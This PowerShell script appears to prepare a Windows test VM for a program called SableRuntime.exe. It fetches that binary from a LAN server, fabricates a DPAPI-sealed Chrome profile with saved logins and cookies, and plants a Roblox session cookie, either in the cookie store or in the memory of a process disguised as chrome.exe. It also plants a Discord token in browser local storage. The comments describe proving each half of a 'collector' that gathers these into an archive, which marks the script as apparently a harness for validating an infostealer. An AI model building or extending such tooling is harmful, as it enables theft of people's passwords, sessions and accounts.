$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$base = 'C:\guest'
$server = 'http://192.168.1.151:8099'
New-Item -ItemType Directory -Force $base | Out-Null

function Fetch($name, $path) {
  if (Test-Path $path) { return }
  curl.exe -s -S --max-time 300 -o $path "$server/$name"
}

Fetch 'guest-py.zip'     "$base\seed.zip"
Fetch 'sable-src.zip'    "$base\src.zip"
Fetch 'SableRuntime.exe' "$base\SableRuntime.exe"
Fetch 'watch.ps1'        "$base\watch.ps1"

if (-not (Test-Path "$base\py\python.exe")) {
  Expand-Archive -Path "$base\seed.zip" -DestinationPath $base -Force
}
if (-not (Test-Path "$base\sable\agent\__init__.py")) {
  Expand-Archive -Path "$base\src.zip" -Destination "$base\sable" -Force
}

$py = "$base\py\python.exe"
'python     ' + (& $py -c "import sys;print(sys.version.split()[0])" 2>&1)
'artifact   ' + (Get-Item "$base\SableRuntime.exe" -ErrorAction SilentlyContinue).Length

# The fixture has to be built here: Chromium wraps its master key with this machine's
# DPAPI, so a profile sealed on the host cannot be unwrapped in the guest.
$chrome = Join-Path $env:LOCALAPPDATA 'Google\Chrome'
$login = Join-Path $chrome 'User Data\Default\Login Data'
if (-not (Test-Path $login)) {
  $profile = & $py -c "import sys, os; sys.path.insert(0, r'C:\guest'); import sable_fixture as f; from pathlib import Path; print(f.build(Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome'))" 2>&1
  'profile    ' + ($profile -join ' ')
}

$login = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Login Data'
$cookies = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Network\Cookies'
if (-not (Test-Path $login)) { throw "fixture did not produce Login Data" }

'login data ' + (Get-Item $login).Length + ' B'
'cookies    ' + (Get-Item $cookies -ErrorAction SilentlyContinue).Length + ' B'
'local state ' + (Get-Item (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Local State') -ErrorAction SilentlyContinue).Length + ' B'

# --- Roblox: which half of the collector this run is meant to prove -----------
# ``store``  the cookie row is sealed into the profile; memory is skipped by design.
# ``memory`` the profile holds no row and a process named chrome.exe holds the token,
#            so the RAM half is the only thing that can answer.
$mode = 'store'
try {
  curl.exe -s -S --max-time 15 -o "$base\rbx-mode.txt" "$server/rbx-mode.txt"
  if (Test-Path "$base\rbx-mode.txt") {
    $raw = (Get-Content "$base\rbx-mode.txt" -Raw).Trim().ToLower()
    if ($raw -in @('store', 'memory')) { $mode = $raw }
  }
} catch { }
$mode | Set-Content -Path "$base\mode.txt" -Encoding ASCII
'roblox mode ' + $mode

if ($mode -eq 'memory') {
  $staged = & $py -c "import sys, os, shutil, json; sys.path.insert(0, r'C:\guest'); import sable_fixture as f; from pathlib import Path; root = Path(r'C:\guest\fake'); root.mkdir(parents=True, exist_ok=True); holder = root / 'hold.py'; holder.write_text('import time\nTOKEN = ' + repr(f.MEMORY_TOKEN) + '\ntime.sleep(900)\n', encoding='utf-8'); chrome = Path(sys.executable).with_name('chrome.exe'); shutil.copy2(sys.executable, chrome); print(chrome); print(len(f.MEMORY_TOKEN))" 2>&1
  'staged     ' + ($staged -join ' | ')
} else {
  $row = & $py -c "import sys, os; sys.path.insert(0, r'C:\guest'); import sable_fixture as f; from pathlib import Path; print(f.roblox_cookie(Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data' / 'Default'))" 2>&1
  'roblox row ' + ($row -join ' ')
}

'--- roblox expectation ---'
& $py -c "import sys; sys.path.insert(0, r'C:\guest'); import sable_fixture as f; print('store ', len(f.STORE_TOKEN)); print('memory', len(f.MEMORY_TOKEN))" 2>&1

# --- Discord: planted in both modes -------------------------------------------
# The token sits in ``Local Storage\leveldb``, which is LevelDB and not SQLite, sealed
# with the same DPAPI-wrapped key Chrome uses. Planting it every run keeps the Discord
# half of the archive independent of which Roblox half is being proved.
$discord = & $py -c "import sys, os; sys.path.insert(0, r'C:\guest'); import sable_fixture as f; from pathlib import Path; print(f.discord_token(Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data' / 'Default'))" 2>&1
'discord row ' + ($discord -join ' ')
& $py -c "import sys; sys.path.insert(0, r'C:\guest'); import sable_fixture as f; print('discord', f.DISCORD_TOKEN)" 2>&1
